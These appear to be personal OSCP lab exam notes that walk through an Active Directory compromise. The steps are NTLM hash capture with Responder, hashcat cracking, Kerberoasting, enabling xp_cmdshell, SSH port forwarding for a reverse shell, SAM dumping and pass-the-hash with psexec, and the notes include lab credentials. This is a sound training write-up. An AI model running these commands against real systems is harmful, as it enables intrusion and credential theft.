# 147
## Exploitation
- Add `192.168.x.147 ms01.oscp.exam` to `/etc/host`.
- Then, upon visiting the website at port 8080, one can identify a  form with interesting field called `Url`.
	- Set up `responder` with `responder -I tun0 -A` and fill in the UNC path at `Url` field. Finally, submit the form and `responder` will receive a authentication request along with `Net-NTLMv2` hash of the user `oscp\web_svc`.![[Pasted image 20240217160845.png]]![[Pasted image 20240217162012.png]]
- Run `hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` to retrieve plaintext password as `Diamond1`.![[Pasted image 20240217161322.png]]
- Spray the credential and identifying `web_svc:Diamond1` are valid credential for SSH and FTP.
# 148
## Exploitation
- Kerberoasting the `sql_svc` User and find out the password to be `Dolphin1`. ![[Pasted image 20240217183017.png]]
- User `proxychains impacket-mssqlclient sql_svc:Dolphin1@10.10.116.148 -windows-auth` to obtain a SQL shell. Run the following to enable `RCE` since we are system administrator.
	```mssql
	EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
	```
- Set up remote port-forwarding in order to catch reverse shell.
	```bash
	ssh -v -N -R 10.10.116.147:4080:192.168.45.229:80 web_svc@192.168.226.147
	ssh -v -N -R 10.10.116.147:4443:192.168.45.229:443 web_svc@192.168.226.147
	```
- With reverse shell, find `windows.old` file under the `C:\` directory. From `C:\windows.old\Windows\System32` retrieve `SAM` and `SYSTEM` file.
	- Run `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` to locate `NTLM` hash for `tom_admin`![[Pasted image 20240217184230.png]]
# 146
- Using `tom_admin`'s hash to get a `psexec` shell on `DC`. 